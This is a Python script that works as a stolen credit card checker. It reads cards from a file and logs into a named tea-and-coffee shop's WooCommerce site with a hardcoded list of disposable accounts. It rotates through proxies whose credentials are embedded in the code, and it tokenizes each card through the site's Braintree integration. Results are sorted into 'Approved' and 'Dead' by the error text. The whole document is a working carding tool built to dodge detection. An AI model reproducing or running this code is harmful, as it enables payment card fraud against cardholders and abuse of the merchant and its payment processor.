import asyncio
import httpx
import re
import random
import base64
import time
import json
from typing import List, Tuple


def load_proxies() -> List[str]:
    """Load and format proxies from the provided list"""
    proxy_list = [
        "geo.g-w.info:10080:NDJlYYoWrpeS7IAj:Ry2OOoVatV4HzSvN",
        "geo.g-w.info:10080:4MEq9Kp7aUrlUXcE:9w4syRRkjcnEhmHq",
        "geo.g-w.info:10080:GJRo0xTr2A9AVSh7:YITGOi3l3jk2tVCO",
        "geo.g-w.info:10080:eoERNRaYasTAx3PU:81GPzRdfk2x2LL73",
        "geo.g-w.info:10080:6ykhnQJkgqyYh46K:FDKjtmQiSmeulm8f",
        "geo.g-w.info:10080:2DeGnIamu6NvRwfp:sRWWft3eeEbRzCMF",
        "geo.g-w.info:10080:B8TIRWKYIKZtKp27:ZSAJPbS5H6kHhCoQ",
        "geo.g-w.info:10080:LDNC0Vw9DaWfLd7l:xdQsIQpu1CIpyDLy",
        "geo.g-w.info:10080:AajPRZKCS7dYWFZc:ygmC1HAXUjSBgJcr",
        "geo.g-w.info:10080:cSR9qG6tx5SwZTHi:iO944YFkNaBStI0z",
        "geo.g-w.info:10080:BjbtksZXbukIlI0e:ES8ZMuAUB6eRkmRr",
        "geo.g-w.info:10080:GvbMmDTPJj2d4Q0n:R5kG3ehF826Jd5di",
        "geo.g-w.info:10080:inRAJ6DIRsJDLyDm:aYNGEL4LcNeBCqBD",
        "geo.g-w.info:10080:AYOvFl48SQdWlOPJ:oHl0qLlTw9R0znxD",
        "geo.g-w.info:10080:VZZeVSXpHXcRGHW9:LinhRzS23XF36OO5",
        "geo.g-w.info:10080:kVQ5vzSSSn0mirOv:ltNcYEvjnm9OFqZL",
        "geo.g-w.info:10080:6tg8Uu5dmvMZVLgg:NwzyAhqcFpu4nxyR",
        "geo.g-w.info:10080:5EnKCjxn9fmzbDu0:5HfqeroWZSRip6Tl",
        "geo.g-w.info:10080:6r7KaOCghddXbjCO:oj214Q39wyLQV60H",
        "geo.g-w.info:10080:r52BqVqpwnxWe0Ms:XspTsqkOtHkORoOJ",
        "geo.g-w.info:10080:lBeLCK8ak0rwlVJT:IVJIzyNxqglcpswU",
        "geo.g-w.info:10080:kkyqfan1BrmTeeWo:RRoN2fN6g3406pXe",
        "geo.g-w.info:10080:ZoJ7MT06tFragTbF:qdQFT5l5o3CFxJ2W",
        "geo.g-w.info:10080:uC9KBImlG7Uoe9Nm:1oX1q9fmn9twRFBr",
        "geo.g-w.info:10080:EIRqS3nHSouF8pVr:Ih18wmqPgv7MPsKA",
        "geo.g-w.info:10080:E1F0miOAQ8Qio6dm:0mBY2wYmbuIskHpk",
        "geo.g-w.info:10080:yI3RRDoinGF8NHNO:Bq8WkOTjSQhkuxP1",
        "geo.g-w.info:10080:8pyrGIRPA5Vu6u9Q:JmUC3vAdYtGIZAPH",
        "geo.g-w.info:10080:SCa77wctskerADdk:wSzMOVHzj9XIkcLI",
        "geo.g-w.info:10080:f519RhDjJBesmbOe:o8YwP0q03Bdsal8Z"
    ]

    # Format proxies to httpx format
    formatted_proxies = []
    for proxy in proxy_list:
        try:
            host_port, username, password = proxy.split(":")
            formatted_proxy = f"http://{username}:{password}@{host_port}"
            formatted_proxies.append(formatted_proxy)
        except ValueError:
            print(f"Invalid proxy format: {proxy}")

    return formatted_proxies


class ProxyRotator:
    """Simple proxy rotator with health checking"""
    def __init__(self, proxies: List[str]):
        self.proxies = proxies
        self.current_index = 0
        self.bad_proxies = set()

    def get_next_proxy(self) -> str:
        """Get next working proxy in rotation"""
        if not self.proxies:
            return None

        # Try to find a working proxy
        for _ in range(len(self.proxies)):
            proxy = self.proxies[self.current_index]
            self.current_index = (self.current_index + 1) % len(self.proxies)

            if proxy not in self.bad_proxies:
                return proxy

        # If all proxies are marked bad, reset and try again
        if len(self.bad_proxies) == len(self.proxies):
            self.bad_proxies.clear()
            return self.proxies[0]

        return None

    def mark_bad(self, proxy: str):
        """Mark a proxy as bad"""
        self.bad_proxies.add(proxy)


async def braintree_check(cc: str, month: str, year: str, cvv: str, proxy_rotator: ProxyRotator = None, max_retries: int = 3) -> Tuple[str, str]:
    """Check card with Braintree with proxy support"""

    for attempt in range(max_retries):
        proxy = None
        if proxy_rotator:
            proxy = proxy_rotator.get_next_proxy()
            if not proxy:
                return "Error! ⚠️", "No working proxies available"

        try:
            # Prepare proxy configuration
            proxy_config = None
            if proxy:
                proxy_config = {
                    "http://": proxy,
                    "https://": proxy
                }

            timeout = httpx.Timeout(30.0, connect=10.0)

            async with httpx.AsyncClient(
                follow_redirects=True,
                verify=False,
                proxies=proxy_config,
                timeout=timeout,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
            ) as client:

                # Format month and year
                if len(month) == 1:
                    month = f'0{month}'
                if len(year) == 2:
                    year = f'20{year}'

                # Random account selection
                accounts = [
                    {"email": "atomicguillemette@tiffincrane.com", "password": "Simon99007"},
                    {"email": "verbalmarti@tiffincrane.com", "password": "Simon99007"},
                    {"email": "deeannewasteful@tiffincrane.com", "password": "Simon99007"},
                    {"email": "blue8874@tiffincrane.com", "password": "Simon99007"},
                    {"email": "homely120@tiffincrane.com", "password": "Simon99007"},
                    {"email": "7576olga@tiffincrane.com", "password": "Simon99007"},
                    {"email": "grubbyflorina@tiffincrane.com", "password": "Simon99007"},
                    {"email": "xavoje5906@filipx.com", "password": "Simon99007"},
                    {"email": "vamenuky@denipl.com", "password": "Simon99007"},
                    {"email": "mowuraza@denipl.com", "password": "Simon99007"},
                    {"email": "leonieconceptual@2200freefonts.com", "password": "Simon99007@"},
                    {"email": "ealasaid27@2200freefonts.com", "password": "Simon99007"},
                    {"email": "154relieved@2200freefonts.com", "password": "Simon99007"},
                    {"email": "50intermediate@2200freefonts.com", "password": "Simon99007"},
                    {"email": "3996harli@2200freefonts.com", "password": "Simon99007"},
                    {"email": "bronzeintelligent@2200freefonts.com", "password": "Simon99007"},
                    {"email": "lindsay53@comfythings.com", "password": "Simon99007@"},
                    {"email": "statutory14@comfythings.com", "password": "Simon99007@"}
                ]
                account = random.choice(accounts)

                # Initial request with proxy info
                proxy_info = f" via {proxy.split('@')[1]}" if proxy else ""
                print(f"Attempt {attempt + 1}{proxy_info}")

                # Get login page
                response = await client.get('https://www.tea-and-coffee.com/account/')

                if response.status_code != 200:
                    if proxy_rotator and proxy:
                        proxy_rotator.mark_bad(proxy)
                    continue

                # Extract login nonce
                login_nonce_match = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text)
                if not login_nonce_match:
                    if proxy_rotator and proxy:
                        proxy_rotator.mark_bad(proxy)
                    continue

                nonce = login_nonce_match.group(1)

                # Login
                login_data = {
                    'username': account['email'],
                    'password': account['password'],
                    'woocommerce-login-nonce': nonce,
                    '_wp_http_referer': '/account/',
                    'login': 'Log in',
                }

                response = await client.post(
                    'https://www.tea-and-coffee.com/account/',
                    data=login_data
                )

                # Check login success
                if not ('Log out' in response.text or 'My Account' in response.text):
                    if proxy_rotator and proxy:
                        proxy_rotator.mark_bad(proxy)
                    continue

                # Get payment method page
                response = await client.get('https://www.tea-and-coffee.com/account/add-payment-method-custom/')

                # Extract payment nonce
                payment_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
                if not payment_nonce_match:
                    if proxy_rotator and proxy:
                        proxy_rotator.mark_bad(proxy)
                    continue

                nonce = payment_nonce_match.group(1)

                # Extract client token nonce
                client_nonce_match = re.search(r'client_token_nonce":"([^"]+)"', response.text)
                if not client_nonce_match:
                    if proxy_rotator and proxy:
                        proxy_rotator.mark_bad(proxy)
                    continue

                client_nonce = client_nonce_match.group(1)

                # Get client token
                token_data = {
                    'action': 'wc_braintree_credit_card_get_client_token',
                    'nonce': client_nonce,
                }

                response = await client.post(
                    'https://www.tea-and-coffee.com/wp-admin/admin-ajax.php',
                    data=token_data
                )

                if response.status_code != 200:
                    if proxy_rotator and proxy:
                        proxy_rotator.mark_bad(proxy)
                    continue

                token_response = response.json()
                if 'data' not in token_response:
                    if proxy_rotator and proxy:
                        proxy_rotator.mark_bad(proxy)
                    continue

                enc = token_response['data']
                try:
                    dec = base64.b64decode(enc).decode('utf-8')
                except:
                    if proxy_rotator and proxy:
                        proxy_rotator.mark_bad(proxy)
                    continue

                # Extract authorization fingerprint
                authorization_match = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
                if not authorization_match:
                    if proxy_rotator and proxy:
                        proxy_rotator.mark_bad(proxy)
                    continue

                authorization = authorization_match[0]

                # Tokenize card with Braintree
                braintree_headers = {
                    'authority': 'payments.braintree-api.com',
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'authorization': f'Bearer {authorization}',
                    'braintree-version': '2018-05-10',
                    'content-type': 'application/json',
                    'origin': 'https://assets.braintreegateway.com',
                    'referer': 'https://assets.braintreegateway.com/',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36',
                }

                tokenize_data = {
                    'clientSdkMetadata': {
                        'source': 'client',
                        'integration': 'custom',
                        'sessionId': str(random.randint(1000000000, 9999999999)),
                    },
                    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
                    'variables': {
                        'input': {
                            'creditCard': {
                                'number': cc,
                                'expirationMonth': month,
                                'expirationYear': year,
                                'cvv': cvv,
                            },
                            'options': {
                                'validate': False,
                            },
                        },
                    },
                }

                response = await client.post(
                    'https://payments.braintree-api.com/graphql',
                    headers=braintree_headers,
                    json=tokenize_data
                )

                if response.status_code != 200:
                    # Parse error message for status determination
                    try:
                        error_response = response.json()
                        if 'errors' in error_response:
                            error_msg = error_response['errors'][0].get('message', 'Tokenization failed')

                            if "cvv" in error_msg.lower() or "security code" in error_msg.lower():
                                return "Approved! ✅ -» ccn", error_msg
                            elif "insufficient funds" in error_msg.lower():
                                return "Approved! ✅ -» low funds", error_msg
                            elif "avs" in error_msg.lower():
                                return "Approved! ✅ -» avs", error_msg
                    except:
                        pass

                    if proxy_rotator and proxy:
                        proxy_rotator.mark_bad(proxy)
                    continue

                tokenize_response = response.json()
                if 'data' not in tokenize_response or 'tokenizeCreditCard' not in tokenize_response['data']:
                    if 'errors' in tokenize_response:
                        error_msg = tokenize_response['errors'][0].get('message', 'Tokenization failed')

                        if "cvv" in error_msg.lower() or "security code" in error_msg.lower():
                            return "Approved! ✅ -» ccn", error_msg
                        elif "insufficient funds" in error_msg.lower():
                            return "Approved! ✅ -» low funds", error_msg
                        elif "avs" in error_msg.lower():
                            return "Approved! ✅ -» avs", error_msg

                    if proxy_rotator and proxy:
                        proxy_rotator.mark_bad(proxy)
                    continue

                tok = tokenize_response['data']['tokenizeCreditCard']['token']

                # Submit payment
                payment_headers = {
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.tea-and-coffee.com',
                    'referer': 'https://www.tea-and-coffee.com/account/add-payment-method-custom/',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36',
                }

                card_type = "visa" if cc.startswith("4") else "mastercard" if cc.startswith("5") else "discover"

                payment_data = {
                    'payment_method': 'braintree_credit_card',
                    'wc-braintree-credit-card-card-type': card_type,
                    'wc-braintree-credit-card-3d-secure-enabled': '',
                    'wc-braintree-credit-card-3d-secure-verified': '',
                    'wc-braintree-credit-card-3d-secure-order-total': '20.78',
                    'wc_braintree_credit_card_payment_nonce': tok,
                    'wc_braintree_device_data': '',
                    'wc-braintree-credit-card-tokenize-payment-method': 'true',
                    'woocommerce-add-payment-method-nonce': nonce,
                    '_wp_http_referer': '/account/add-payment-method-custom/',
                    'woocommerce_add_payment_method': '1',
                }

                response = await client.post(
                    'https://www.tea-and-coffee.com/account/add-payment-method-custom/',
                    headers=payment_headers,
                    data=payment_data,
                    follow_redirects=True
                )

                response_text = response.text

                # Check for success
                if any(success_msg in response_text for success_msg in [
                    'Nice! New payment method added', 
                    'Payment method successfully added',
                    'Payment method added',
                    'successfully added'
                ]):
                    return "Approved! ✅", "Success -» $0"

                # Check for specific errors
                error_pattern = r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>'
                error_match = re.search(error_pattern, response_text, re.DOTALL)

                if error_match:
                    error_msg = error_match.group(1).strip()
                    if "cvv" in error_msg.lower() or "security code" in error_msg.lower():
                        return "Approved! ✅ -» ccn", error_msg
                    elif "insufficient funds" in error_msg.lower():
                        return "Approved! ✅ -» low funds", error_msg
                    elif "avs" in error_msg.lower():
                        return "Approved! ✅ -» avs", error_msg
                    else:
                        return "Dead! ❌", error_msg

                # General failure
                if 'woocommerce-error' in response_text:
                    return "Dead! ❌", "Payment Failed"

                return "Dead! ❌", "Unknown response"

        except httpx.ProxyError as e:
            print(f"Proxy error: {e}")
            if proxy_rotator and proxy:
                proxy_rotator.mark_bad(proxy)
            await asyncio.sleep(1)
            continue

        except httpx.TimeoutException:
            print(f"Timeout with proxy")
            if proxy_rotator and proxy:
                proxy_rotator.mark_bad(proxy)
            await asyncio.sleep(1)
            continue

        except httpx.ConnectError as e:
            print(f"Connection error: {e}")
            if proxy_rotator and proxy:
                proxy_rotator.mark_bad(proxy)
            await asyncio.sleep(1)
            continue

        except Exception as e:
            if attempt == max_retries - 1:  # Last attempt
                return "Error! ⚠️", f"Exception: {str(e)}"
            await asyncio.sleep(1)
            continue

    return "Error! ⚠️", f"Max retries ({max_retries}) exceeded"


async def main():
    try:
        # Load proxies
        proxies = load_proxies()
        print(f"Loaded {len(proxies)} proxies")

        # Create proxy rotator
        proxy_rotator = ProxyRotator(proxies)

        # Load cards
        with open('cards.txt', 'r') as f:
            cards = [line.strip() for line in f if line.strip()]

        print(f"Loaded {len(cards)} cards")
        print("-" * 50)

        # Process cards
        for card_line in cards:
            parts = card_line.strip().split('|')
            if len(parts) != 4:
                print(f"Invalid format: {card_line}")
                continue

            cc, month, year, cvv = parts
            print(f"\nProcessing: {cc[:6]}XXXXXX{cc[-4:]} | {month}/{year}")

            # Check card with proxy rotation
            status, msg = await braintree_check(cc, month, year, cvv, proxy_rotator)

            print(f"Status: {status}")
            print(f"Message: {msg}")
            print("-" * 50)

            # Delay between cards
            await asyncio.sleep(random.uniform(2, 4))

    except FileNotFoundError:
        print("Error: cards.txt not found!")
    except Exception as e:
        print(f"Unexpected error: {e}")


if __name__ == "__main__":
    asyncio.run(main())
